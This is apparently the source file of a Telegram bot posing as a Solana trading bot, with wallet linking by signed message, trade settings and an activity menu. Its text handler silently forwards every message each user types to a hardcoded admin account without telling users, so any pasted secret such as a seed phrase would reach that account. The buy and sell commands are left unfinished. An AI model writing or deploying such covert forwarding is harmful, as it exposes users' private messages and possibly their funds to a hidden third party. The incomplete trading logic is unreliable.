// @ts-nocheck
import dotenv from 'dotenv';
import { Telegraf, Markup } from 'telegraf';
import * as solanaWeb3 from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';

import { mintToken } from './mint';
import { sellWithOrca } from './sell';
import { autoBuy, getBoughtAmount } from './utils/autoBuy';

dotenv.config();

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const ADMIN_ID = 7948630771;
const WELCOME_STICKER = 'CAACAgUAAxkBAAEBQY1kZ...'; // Replace with a valid sticker ID

if (!BOT_TOKEN) throw new Error('❌ TELEGRAM_BOT_TOKEN is missing from .env');

const bot = new Telegraf(BOT_TOKEN);
const users = Object.create(null);
const awaitingUsers = Object.create(null);
const pendingWalletVerifications = Object.create(null);

async function sendToAdmin(message, ctx) {
  if (ADMIN_ID && Number(ADMIN_ID) > 0) {
    try {
      await ctx.telegram.sendMessage(ADMIN_ID, message);
    } catch (err) {
      if (err?.response?.error_code === 400) {
        console.error('⚠️ Admin has not started the bot yet.');
      } else {
        console.error('Failed to send message to admin:', err);
      }
    }
  }
}

bot.start(async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]) users[userId] = { trades: 0, activeTrades: 1, history: [] };

  try {
    await ctx.replyWithSticker(WELCOME_STICKER);
  } catch (e) {}

  await ctx.reply(
    '👋 Welcome to the trading bot!',
    Markup.inlineKeyboard([
      [Markup.button.callback('🔗 Connect Wallet', 'connect_wallet')],
      [Markup.button.callback('📊 My Activity', 'show_activity')],
      [Markup.button.callback('⚙️ Set Trades', 'set_trades')],
      [Markup.button.callback('❓ Help', 'help')]
    ])
  );
});

bot.action('back_to_menu', async (ctx) => {
  await ctx.replyWithChatAction('typing');
  await ctx.reply(
    '⬅️ *Main Menu:*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔗 Connect Wallet', 'connect_wallet')],
        [Markup.button.callback('📊 My Activity', 'show_activity')],
        [Markup.button.callback('⚙️ Set Trades', 'set_trades')],
        [Markup.button.callback('❓ Help', 'help')]
      ])
    }
  );
});

bot.action('connect_wallet', async (ctx) => {
  const userId = String(ctx.from?.id);
  const nonce = crypto.randomBytes(16).toString('hex');
  const message = 'Authorize connection to bot: ' + nonce;
  pendingWalletVerifications[userId] = { address: '', message };

  await ctx.reply(
    `🚀 *To connect your wallet:*
1️⃣ Send your public wallet address here.
2️⃣ You'll receive a message to sign.
3️⃣ Open your wallet (Phantom, Solflare...) > Sign Message.
4️⃣ Send back the signature.`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('show_activity', async (ctx) => {
  const userId = String(ctx.from?.id);
  const history = users[userId]?.history || [];
  const text = history.length ? history.map((h) => `• ${h}`).join('\n') : 'No activity yet.';

  await ctx.reply(`📊 *Your Activity:*\n${text}`, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Back', 'back_to_menu')]])
  });
});

bot.action('set_trades', async (ctx) => {
  const userId = String(ctx.from?.id);
  awaitingUsers[userId] = 'set_trades';

  await ctx.reply(
    '🔢 *Enter number of trades (1 to 10):*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'cancel_input')]])
    }
  );
});

bot.action('cancel_input', async (ctx) => {
  const userId = String(ctx.from?.id);
  delete awaitingUsers[userId];
  await ctx.reply('❌ Input cancelled.');
});

bot.on('text', async (ctx) => {
  const userId = String(ctx.from?.id);
  const text = ctx.message.text.trim();
  const name = ctx.from?.first_name || '';

  await sendToAdmin(`Message from ${name}:\n${text}`, ctx);

  if (awaitingUsers[userId] === 'set_trades') {
    const num = parseInt(text);
    if (isNaN(num) || num < 1 || num > 10) {
      await ctx.reply('❌ Must be a number between 1 and 10.');
    } else {
      users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
      users[userId].activeTrades = num;
      users[userId].history.push(`Set trades to: ${num}`);
      await ctx.reply(`✅ Trades set to ${num}.`);
    }
    delete awaitingUsers[userId];
    return;
  }

  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
    const message = pendingWalletVerifications[userId]?.message;
    if (!pendingWalletVerifications[userId]) {
  pendingWalletVerifications[userId] = {};
}
pendingWalletVerifications[userId].address = text;
    await ctx.reply(`📝 Sign the following message:\n\n${message}`);
    return;
  }

  if (/^[1-9A-HJ-NP-Za-km-z]{80,120}$/.test(text) && pendingWalletVerifications[userId]) {
    const { address, message } = pendingWalletVerifications[userId];
    try {
      const pubkey = new solanaWeb3.PublicKey(address);
      const signature = bs58.decode(text);
      const nacl = await import('tweetnacl');
      const isValid = nacl.default.sign.detached.verify(
        Buffer.from(message),
        signature,
        pubkey.toBytes()
      );
      if (isValid) {
        users[userId] = users[userId] || { trades: 0, activeTrades: 1, history: [] };
        users[userId].wallet = address;
        users[userId].history.push(`✅ Wallet linked: ${address}`);
        delete pendingWalletVerifications[userId];
        await ctx.reply('✅ *Wallet linked successfully!*', {
          parse_mode: 'Markdown'
        });
        await sendToAdmin(`✅ Wallet linked by ${name}:\n${address}`, ctx);
      } else {
        await ctx.reply('❌ Invalid signature.');
      }
    } catch (err) {
      await ctx.reply('❌ Signature verification failed.');
    }
    return;
  }
});

bot.command('buy', async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]?.wallet) return ctx.reply('❌ Please connect your wallet first.');
  awaitingUsers[userId + '_buy'] = true;
  ctx.reply('🔍 Send the token mint address to buy:');
});

bot.command('sell', async (ctx) => {
  const userId = String(ctx.from?.id);
  if (!users[userId]?.wallet) return ctx.reply('❌ Please connect your wallet first.');
  awaitingUsers[userId + '_sell'] = true;
  ctx.reply('💰 Send the token mint address to sell:');
});

bot.launch()
  .then(() => console.log('✅ Bot is running'))
  .catch((err) => console.error('❌ Bot launch failed:', err));
